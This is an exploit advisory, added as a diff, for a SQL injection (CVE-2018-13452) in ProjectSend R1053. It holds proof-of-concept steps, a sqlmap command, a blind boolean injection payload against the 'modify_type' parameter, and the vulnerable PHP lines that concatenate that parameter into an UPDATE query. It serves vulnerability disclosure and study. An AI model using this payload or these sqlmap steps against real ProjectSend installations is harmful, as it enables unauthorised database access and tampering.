@@ -1,0 +1,61 @@
+id: 30795
+date: 07/29/2018
+title: ProjectSend - SQL Injection Vulnerability
+author: GUIA Brahim Fouad
+cves: CVE-2018-13452
+
+# Exploit Title: ProjectSend - SQL Injection
+# Exploit Author: GUIA BRAHIM FOUAD
+# Vendor Homepage: https://www.projectsend.org/
+# Software Link: https://www.projectsend.org/download/241/
+# Version: R1053
+# Tested on: ProjectSend version: R1053, php version: 7.0, MySQL version: 5.7
+# CVE : CVE-2018-13452
+
+POC : 
+
+1 - must be logged in 
+2 - need to upload file and get id of this file
+3 - add relation to this file ( assigned to user )
+
+http://localhost/ProjectSend/manage-files.php?modify_type=<sqli>&action=show&batch[]=<id file>&modify_id=<id file>
+
+sqlmap.py -u "http://localhost/ProjectSend/manage-files.php?modify_type=4&action=show&batch[]=4&modify_id=4" --cookie="PHPSESSID=9jvcf5n4td8kvia6orjkp89mmt;" 
+
+---
+Parameter: modify_type (GET)
+    Type: boolean-based blind
+    Title: MySQL >= 5.0 boolean-based blind - Parameter replace
+    Payload: modify_type=(SELECT (CASE WHEN (1907=1907) THEN 1907 ELSE 1907*(SELECT 1907 FROM INFORMATION_SCHEMA.PLUGINS) END))&action=show&batch[]=4&modify_id=4
+---
+
+
+Description of the problem :
+SQL Injection (unquoted)
+
+File : manage-files.php
+
+The GET parameter 'modify_type' is received in line 134 of the file manage-files.php.
+
+Line| Code
+132 | foreach ($selected_files as $work_file) {
+133 | $this_file = new FilesActions();
+134 | $this_file->change_files_hide_status('1', $work_file, $_GET['modify_type'], $_GET['modify_id']);
+
+The user-supplied data is concatenated into sql markup in line 180 of the file includes/classes/actions-files.php in the function change_files_hide_status().
+
+The user-supplied data is then used unsanitized in the sensitive operation prepare() in line 181 of the file includes/classes/actions-files.php in the method FilesActions::change_files_hide_status().
+
+File : includes/classes/actions-files.php
+
+Line| Code
+174 | class FilesActions{function change_files_hide_status($change_to, $file_id, $modify_type, $modify_id){
+180 | $this->sql = "UPDATE " . TABLE_FILES_RELATIONS . " SET hidden=:hidden WHERE file_id = :file_id AND " . $modify_type . " = :modify_id";
+181 | $this->dbh->prepare($this->sql);
+
+Environment
+ProjectSend version: R1053
+php version: 7.0
+MySQL version: 5.7
+
+#  0day.today [2023-03-22]  #
